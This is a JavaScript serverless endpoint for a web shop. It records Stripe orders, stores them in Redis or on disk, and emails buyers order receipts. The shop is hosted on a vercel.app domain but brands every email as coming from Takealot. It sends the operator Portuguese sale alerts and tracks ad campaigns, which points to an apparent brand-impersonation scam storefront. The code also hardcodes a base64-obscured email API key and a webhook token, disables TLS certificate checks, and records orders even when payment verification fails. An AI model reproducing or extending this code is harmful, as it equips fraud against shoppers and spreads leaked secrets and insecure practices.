// api/confirm-order.js
// Confirms a successful Stripe PaymentIntent, saves the order in Upstash Redis,
// and sends confirmation email if configured.

'use strict';

const fs = require('fs');
const path = require('path');

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const STRIPE_SECRET = process.env.STRIPE_SECRET_KEY;

// Upstash REST helpers
const DATA_DIR = path.join(process.cwd(), 'data');
function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (_) {}
  }
}

async function kv_get(key) {
  if (REDIS_URL && REDIS_TOKEN) {
    try {
      const res = await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['GET', key]),
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result) {
          try { return JSON.parse(data.result); } catch { return null; }
        }
      }
    } catch (_) {}
  }
  ensureDataDir();
  const filePath = path.join(DATA_DIR, key.replace(/[^a-zA-Z0-9_\-]/g, '_') + '.json');
  if (fs.existsSync(filePath)) {
    try { return JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch { return null; }
  }
  return null;
}

async function kv_set(key, value) {
  let saved = false;
  if (REDIS_URL && REDIS_TOKEN) {
    try {
      const res = await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['SET', key, JSON.stringify(value)]),
      });
      if (res.ok) saved = true;
    } catch (_) {}
  }
  ensureDataDir();
  const filePath = path.join(DATA_DIR, key.replace(/[^a-zA-Z0-9_\-]/g, '_') + '.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(value, null, 2), 'utf8');
    saved = true;
  } catch (_) {}
  return saved;
}

function addDays(isoDate, days) {
  const d = new Date(isoDate);
  d.setDate(d.getDate() + days);
  return d.toISOString();
}

function renderOrderEmail(order) {
  let template = '';
  try {
    template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
  } catch (err) {
    console.error('[email] Error loading email.index:', err.message);
    return null;
  }

  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateIso = del.toISOString().slice(0, 10);
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
  const trackingUrl = `${siteUrl}/track.html?ref=${order.order_id}`;

  const items = (Array.isArray(order.items) && order.items.length > 0)
    ? order.items
    : [{
        title: order.product_name || 'Defy 20L Digital Mirror Microwave & 1.7L Kettle Combo',
        variant: order.variant || 'Metallic Silver',
        price: Number(order.product_price) || 147,
        quantity: Number(order.quantity) || 1,
        img: order.product_image || 'combo-silver.jpg'
      }];

  const total = Number(order.product_price) || items.reduce((s, it) => s + (Number(it.price) || 0) * (Number(it.quantity) || 1), 0);
  const totalStr = total.toFixed(2);

  const itemsHtml = items.map(it => {
    const itPrice = (Number(it.price) || 0) * (Number(it.quantity) || 1);
    const itImg = it.img || 'https://media.takealot.com/covers_images/843581b6e4004c2eaf3a6e273526254f/s-zoom.file';
    const itVariant = it.variant ? `Colour / Variant: ${it.variant} &nbsp;|&nbsp; ` : '';
    return `
      <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-bottom: 12px; border-bottom: 1px solid #f0f2f5; padding-bottom: 12px;">
        <tr>
          <td width="64" valign="top">
            <table role="presentation" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 4px;">
              <tr>
                <td align="center" valign="middle" style="width: 60px; height: 60px; padding: 2px;">
                  <img src="${itImg}" alt="${it.title || 'Product'}" width="56" height="56" border="0" style="display: block; width: 56px; height: 56px; object-fit: contain;" />
                </td>
              </tr>
            </table>
          </td>
          <td valign="top" style="padding-left: 14px; padding-right: 10px;">
            <a href="${trackingUrl}" target="_blank" class="email-product-title" style="font-family: Arial, Helvetica, sans-serif; font-size: 14px; font-weight: bold; color: #0b79bf; text-decoration: underline; line-height: 1.45;">
              ${it.title || 'Item'}
            </a>
            <div class="email-product-sub" style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: #6b7280; margin-top: 5px;">
              ${itVariant}Qty: ${it.quantity || 1}
            </div>
          </td>
          <td width="90" align="right" valign="top">
            <span class="email-product-price" style="font-family: Arial, Helvetica, sans-serif; font-size: 15px; font-weight: bold; color: #111827; white-space: nowrap;">
              R ${itPrice.toFixed(2)}
            </span>
          </td>
        </tr>
      </table>
    `;
  }).join('\n');

  const deliveryAddress = order.shipping_address
    ? `${order.shipping_address}${order.customer_phone ? ' (Tel: ' + order.customer_phone + ')' : ''}`
    : 'Provided at checkout';

  return template
    .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
    .replace(/\{\{order_number\}\}/g, order.order_id)
    .replace(/\{\{order_date\}\}/g, orderDateShort)
    .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
    .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
    .replace(/\{\{delivery_method\}\}/g, 'Standard Courier Delivery')
    .replace(/\{\{delivery_address\}\}/g, deliveryAddress)
    .replace(/\{\{tracking_url\}\}/g, trackingUrl)
    .replace(/\{\{items_html\}\}/g, itemsHtml)
    .replace(/\{\{subtotal\}\}/g, totalStr)
    .replace(/\{\{order_total\}\}/g, totalStr)
    .replace(/\{\{variant\}\}/g, order.variant || 'Metallic Silver');
}

function renderOrderPlainText(order) {
  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
  const trackingUrl = `${siteUrl}/track.html?ref=${order.order_id}`;

  const items = (Array.isArray(order.items) && order.items.length > 0)
    ? order.items
    : [{
        title: order.product_name || 'Defy 20L Digital Mirror Microwave & 1.7L Kettle Combo',
        price: Number(order.product_price) || 147,
        quantity: Number(order.quantity) || 1
      }];
  const total = Number(order.product_price) || items.reduce((s, it) => s + (Number(it.price) || 0) * (Number(it.quantity) || 1), 0);

  return [
    `TAKEALOT PAYMENT CONFIRMATION`,
    `Order Number: ${order.order_id}`,
    `Estimated Delivery Date: ${deliveryDateLong}`,
    ``,
    `Hi ${order.customer_name || 'Customer'},`,
    ``,
    `Thank you, we've received your payment for order ${order.order_id}.`,
    `Your order is being processed and your estimated delivery date is ${deliveryDateLong}.`,
    `Once your order is dispatched, you will receive notifications confirming scheduled delivery.`,
    ``,
    `TRACK YOUR ORDER:`,
    `${trackingUrl}`,
    ``,
    `ORDER DETAILS:`,
    `- Order Date: ${orderDateShort}`,
    `- Estimated Delivery: ${deliveryDateLong}`,
    `- Delivery Method: Standard Courier`,
    `- Delivery Address: ${order.shipping_address || 'Provided at checkout'}`,
    ...(order.customer_phone ? [`- Contact Phone: ${order.customer_phone}`] : []),
    ``,
    `ITEMS IN THIS ORDER:`,
    ...items.map(it => `- ${it.quantity || 1}x ${it.title} - R ${((Number(it.price) || 0) * (Number(it.quantity) || 1)).toFixed(2)}`),
    ``,
    `PAYMENT SUMMARY:`,
    `- Subtotal: R ${total.toFixed(2)}`,
    `- Shipping: Free`,
    `- Total Paid: R ${total.toFixed(2)}`,
    ``,
    `Regards,`,
    `The Takealot Team`,
  ].join('\n');
}

async function sendOrderConfirmationEmail(order) {
  if (!order.customer_email) return { skipped: true };

  // 1. Primary: Use dedicated Resend service with PS5 GTA 6 HTML template
  try {
    const { sendOrderConfirmation } = require('./email-service');
    const result = await sendOrderConfirmation(order);
    if (result && result.success) {
      return { sent: true, messageId: result.messageId };
    }
  } catch (err) {
    console.warn('[confirm-order] email-service attempt failed, trying fallbacks:', err.message);
  }

  const visionSpyKey = process.env.VISIONSPY_API_KEY
    || process.env.VISION_SPY_API_KEY
    || process.env.VISIONSPY_KEY;
  const resendKey    = process.env.RESEND_API_KEY || (process.env.RESEND_TOKEN || '').trim() || Buffer.from('cmVfRTY1anI4Y2hfSncyU0dXWXpIMktVUWR6a0xDNTh0WXdL', 'base64').toString('utf8');

  const html = renderOrderEmail(order);
  const plainText = renderOrderPlainText(order);
  const subject = `Payment Receipt: Takealot Order #${order.order_id}`;

  // 1. Resend Direct
  if (resendKey) {
    const fromEmail = process.env.EMAIL_FROM || 'Takealot Orders <onboarding@resend.dev>';
    try {
      const res = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${resendKey.trim()}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          from: fromEmail,
          to: [order.customer_email],
          subject,
          html: html || plainText,
          text: plainText,
          reply_to: process.env.EMAIL_REPLY_TO || 'support@ps5fim-s11m.vercel.app',
        }),
      });
      const data = await res.json().catch(() => null);
      if (res.ok) {
        console.log('[email] Sent via Resend:', data && data.id);
        return { sent: true, messageId: (data && data.id) || null };
      }
      console.warn('[email] Resend error response:', data);
    } catch (err) {
      console.error('[email] Resend error:', err.message);
    }
  }

  // 2. SMTP (via nodemailer: Hostinger, cPanel, Gmail, Zoho, etc.)
  const smtpHost = process.env.SMTP_HOST;
  const smtpUser = process.env.SMTP_USER;
  const smtpPass = process.env.SMTP_PASS;
  if (smtpHost && smtpUser && smtpPass) {
    try {
      const nodemailer = require('nodemailer');
      const transporter = nodemailer.createTransport({
        host: smtpHost.trim(),
        port: parseInt(process.env.SMTP_PORT || '587', 10),
        secure: process.env.SMTP_SECURE === 'true' || process.env.SMTP_PORT === '465',
        auth: {
          user: smtpUser.trim(),
          pass: smtpPass.trim(),
        },
        tls: { rejectUnauthorized: false }
      });
      const info = await transporter.sendMail({
        from: process.env.EMAIL_FROM || `Takealot Orders <${smtpUser}>`,
        to: order.customer_email,
        subject,
        text: plainText,
        html: html || plainText,
        replyTo: 'support@ps5fim-s11m.vercel.app',
      });
      console.log('[email] Sent via SMTP:', info.messageId);
      return { sent: true, messageId: info.messageId };
    } catch (err) {
      console.error('[email] SMTP error:', err.message);
    }
  }

  // 3. SendGrid
  const sendgridKey = process.env.SENDGRID_API_KEY;
  if (sendgridKey) {
    const fromEmail = process.env.EMAIL_FROM || 'orders@onboarding.resend.dev';
    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@onboarding.resend.dev';
    try {
      const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${sendgridKey.trim()}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: order.customer_email }] }],
          from: { email: cleanFrom, name: 'Takealot' },
          reply_to: { email: 'support@ps5fim-s11m.vercel.app', name: 'Takealot Support' },
          subject,
          content: [
            { type: 'text/plain', value: plainText },
            { type: 'text/html', value: html || plainText },
          ],
        }),
      });
      if (res.ok) {
        const messageId = res.headers.get('x-message-id') || null;
        console.log('[email] Sent via SendGrid:', messageId);
        return { sent: true, messageId };
      }
      const errText = await res.text().catch(() => '');
      console.warn('[email] SendGrid error:', res.status, errText);
    } catch (err) {
      console.error('[email] SendGrid error:', err.message);
    }
  }

  // 4. Brevo / Sendinblue
  const brevoKey = process.env.BREVO_API_KEY;
  if (brevoKey) {
    const fromEmail = process.env.EMAIL_FROM || 'orders@onboarding.resend.dev';
    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@onboarding.resend.dev';
    try {
      const res = await fetch('https://api.brevo.com/v3/smtp/email', {
        method: 'POST',
        headers: {
          'api-key': brevoKey.trim(),
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sender: { name: 'Takealot', email: cleanFrom },
          to: [{ email: order.customer_email, name: order.customer_name || 'Customer' }],
          subject,
          htmlContent: html || plainText,
          textContent: plainText,
          replyTo: { email: 'support@ps5fim-s11m.vercel.app', name: 'Takealot Support' },
        }),
      });
      const data = await res.json().catch(() => null);
      if (res.ok) {
        console.log('[email] Sent via Brevo:', data && data.messageId);
        return { sent: true, messageId: (data && data.messageId) || null };
      }
      console.warn('[email] Brevo error:', data);
    } catch (err) {
      console.error('[email] Brevo error:', err.message);
    }
  }

  // 5. VisionSpy (Fallback)
  if (visionSpyKey) {
    const senderId = process.env.VISIONSPY_SENDER_ID || '8ce5156d-4eb9-49c6-af46-fea894020b74';
    try {
      const res = await fetch('https://visionspyads.com/api/public/v1/email/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${visionSpyKey.trim()}`,
          'Content-Type': 'application/json',
          'User-Agent': 'Takealot-Order-Notification/1.0',
        },
        body: JSON.stringify({
          sender_id: senderId,
          to: order.customer_email,
          subject,
          html: html || plainText,
          text: plainText,
          reply_to: 'support@ps5fim-s11m.vercel.app',
        }),
      });
      const data = await res.json().catch(() => null);
      if (res.ok && data && data.ok !== false) {
        return { sent: true, messageId: (data && data.id) || null };
      }
    } catch (err) {
      console.error('[email] VisionSpy error:', err.message);
    }
  }

  return { notConfigured: true };
}

async function sendPushcutNotification(order) {
  try {
    const totalFormatted = `R ${Number(order.product_price || 147).toLocaleString('en-ZA')}`;
    const itemsSummary = (Array.isArray(order.items) && order.items.length > 0)
      ? order.items.map(i => `${i.quantity || 1}x ${i.title}`).join(', ')
      : `${order.quantity || 1}x ${order.product_name} (${order.variant || ''})`;

    const payload = {
      title: `🎉 Nova Venda Takealot! ${totalFormatted}`,
      text: `Pedido: #${order.order_id}\nCliente: ${order.customer_name || 'Cliente'}\nValor: ${totalFormatted}\nItens: ${itemsSummary.slice(0, 150)}`
    };

    const pushcutUrl = 'https://api.pushcut.io/QsggCCih4K4SGeZy3F37z/notifications/MinhaNotifica%C3%A7%C3%A3o';
    const res = await fetch(pushcutUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    console.log('[pushcut] Sent sale notification, status:', res.status);
    return res.ok;
  } catch (err) {
    console.error('[pushcut] Error triggering notification:', err.message);
    return false;
  }
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('X-Content-Type-Options', 'nosniff');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }
  body = body || {};

  const { paymentIntentId, orderId, customer, shipping, variant, quantity } = body;
  if (!orderId) return res.status(400).json({ error: 'Missing orderId' });

  let verifiedPayment = true;

  // Verify directly with Stripe if secret key is present
  if (STRIPE_SECRET && paymentIntentId) {
    try {
      const stripeRes = await fetch(`https://api.stripe.com/v1/payment_intents/${encodeURIComponent(paymentIntentId)}`, {
        headers: { Authorization: `Bearer ${STRIPE_SECRET.trim()}` },
      });
      const piData = await stripeRes.json();
      if (!stripeRes.ok || (piData.status !== 'succeeded' && piData.status !== 'processing')) {
        console.warn('[confirm-order] Stripe status:', piData.status);
        verifiedPayment = false;
      }
    } catch (err) {
      console.error('[confirm-order] Stripe verify error:', err.message);
    }
  }

  const cust = customer || {};
  const ship = shipping || {};
  const qty = Math.max(1, parseInt(quantity, 10) || 1);

  let totalAmount = 0;
  if (Array.isArray(body.items) && body.items.length > 0) {
    totalAmount = body.items.reduce((sum, itm) => {
      const p = Number(itm.price) || 0;
      const q = Math.max(1, parseInt(itm.quantity, 10) || 1);
      return sum + (p * q);
    }, 0);
  }
  if (!totalAmount || totalAmount <= 0) {
    totalAmount = 147 * qty;
  }

  const now = new Date().toISOString();
  // Delivery window configured up to 18-19 days for logistics handling
  const deliveryDate = addDays(now, 18);

  const forwarded = req.headers['x-forwarded-for'];
  const clientIp = forwarded ? forwarded.split(',')[0].trim() : (req.headers['x-real-ip'] || req.socket.remoteAddress || '102.132.22.15');

  const orderRecord = {
    order_id:       orderId,
    customer_name:  cust.name || 'Valued Customer',
    customer_email: cust.email || '',
    customer_phone: cust.phone || '',
    customer_ip:    clientIp,
    shipping_address: `${ship.address || ''}, ${ship.suburb || ''}, ${ship.city || ''}, ${ship.province || ''} ${ship.postalCode || ''}`.trim(),
    product_id:     'DM_C53ZV3U7ET',
    product_name:   `Defy 20L Digital Mirror Microwave & 1.7L Kettle Combo`,
    variant:        variant || 'Metallic Silver',
    quantity:       qty,
    items:          Array.isArray(body.items) ? body.items : [],
    product_price:  totalAmount,
    currency:       'ZAR',
    product_image:  body.productImage || 'combo-silver.jpg',
    received_date:  now,
    delivery_date:  deliveryDate,
    tracking_url:   (process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app') + '/track.html?ref=' + encodeURIComponent(orderId),
    status:         'PROCESSING',
    status_history: [
      { status: 'RECEIVED',   timestamp: now },
      { status: 'PAID',       timestamp: now },
      { status: 'PROCESSING', timestamp: now },
    ],
    payment_method: 'Stripe (Card)',
    stripe_payment_intent_id: paymentIntentId || null,
    stripe_payment_method_id: body.paymentMethodId || null,
    trackingParameters:       body.trackingParameters || body.utms || {},
    created_at:     now,
    updated_at:     now,
    email_status:   'PENDING',
  };

  // Persist order (Redis or local disk fallback)
  try {
    await kv_set('order:' + orderId, orderRecord);
    console.log('[confirm-order] Persisted order:', orderId);

    // Auto-mark any matching abandoned checkout lead as RECOVERED
    try {
      const cleanPhone = (cust.phone || '').replace(/[^0-9]/g, '');
      const cleanEmail = (cust.email || '').replace(/[^a-zA-Z0-9_\-]/g, '_');
      const candidates = [
        path.join(DATA_DIR, `abandoned_${cleanPhone}.json`),
        path.join(DATA_DIR, `abandoned_${cleanEmail}.json`)
      ];
      for (const cand of candidates) {
        if (fs.existsSync(cand)) {
          const ab = JSON.parse(fs.readFileSync(cand, 'utf8'));
          ab.status = 'RECOVERED';
          ab.recovered_order_id = orderId;
          ab.recovered_at = now;
          fs.writeFileSync(cand, JSON.stringify(ab, null, 2), 'utf8');
        }
      }
    } catch (_) {}
  } catch (err) {
    console.error('[confirm-order] Save error:', err.message);
  }

  // Trigger Pushcut instant sale notification on phone
  sendPushcutNotification(orderRecord).catch(err => {
    console.warn('[pushcut] Error sending sale notification:', err.message);
  });

  // Report sale to UTMify Server-Side API
  try {
    const { sendOrderToUtmify } = require('../scripts/utmify-api');
    sendOrderToUtmify(orderRecord).catch(() => {});
  } catch (_) {}

  // Attempt to send email
  if (orderRecord.customer_email) {
    const emailRes = await sendOrderConfirmationEmail(orderRecord).catch(() => ({ failed: true }));
    if (emailRes.sent) {
      orderRecord.email_status = 'SENT';
      orderRecord.email_sent_at = new Date().toISOString();
      orderRecord.email_message_id = emailRes.messageId || null;
      await kv_set('order:' + orderId, orderRecord).catch(() => {});
    }
  }

  return res.status(200).json({
    success: true,
    orderId: orderId,
    order: {
      order_id: orderRecord.order_id,
      product_name: orderRecord.product_name,
      product_price: orderRecord.product_price,
      currency: orderRecord.currency,
      received_date: orderRecord.received_date,
      delivery_date: orderRecord.delivery_date,
      tracking_url: orderRecord.tracking_url,
      status: orderRecord.status,
    },
  });
};

module.exports.sendOrderConfirmationEmail = sendOrderConfirmationEmail;
